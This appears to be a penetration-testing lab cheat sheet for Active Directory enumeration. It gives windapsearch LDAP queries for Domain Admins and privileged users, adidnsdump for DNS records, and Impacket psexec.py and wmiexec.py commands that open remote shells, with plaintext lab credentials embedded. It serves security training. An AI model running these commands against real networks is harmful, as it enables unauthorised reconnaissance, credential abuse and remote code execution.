# 01.13 LDAP Windapsearch Enumeration

> Wrap LDAP queries with `windapsearch --da -PU -U` and uncover hidden AD-integrated DNS via `adidnsdump`.

## Overview

windapsearch wraps common LDAP queries (--da, -PU, -U). psexec.py and wmiexec.py from Impacket provide credentialed execution shells. adidnsdump enumerates AD-integrated DNS for hidden hostnames.

## Steps

- windapsearch --da — list Domain Admin accounts via LDAP.
- windapsearch -PU — list privileged users.
- psexec.py — semi-interactive shell with SYSTEM; uses SMB.
- wmiexec.py — semi-interactive shell via WMI, less noisy.
- adidnsdump — retrieve all DNS records including unknown ones.

## Commands

### windapsearch DA

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@<DOMAIN>.local -p Klmcargo2 --da
```

### windapsearch privileged users

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@<DOMAIN>.local -p Klmcargo2 -PU
```

### psexec.py shell

```bash
psexec.py <DOMAIN>.local/wley:'transporter@4'@172.16.5.125
```

### wmiexec.py shell

```bash
wmiexec.py <DOMAIN>.local/wley:'transporter@4'@172.16.5.5
```

### adidnsdump

```bash
adidnsdump -u <DOMAIN>\\forend ldap://172.16.5.5 -r
```
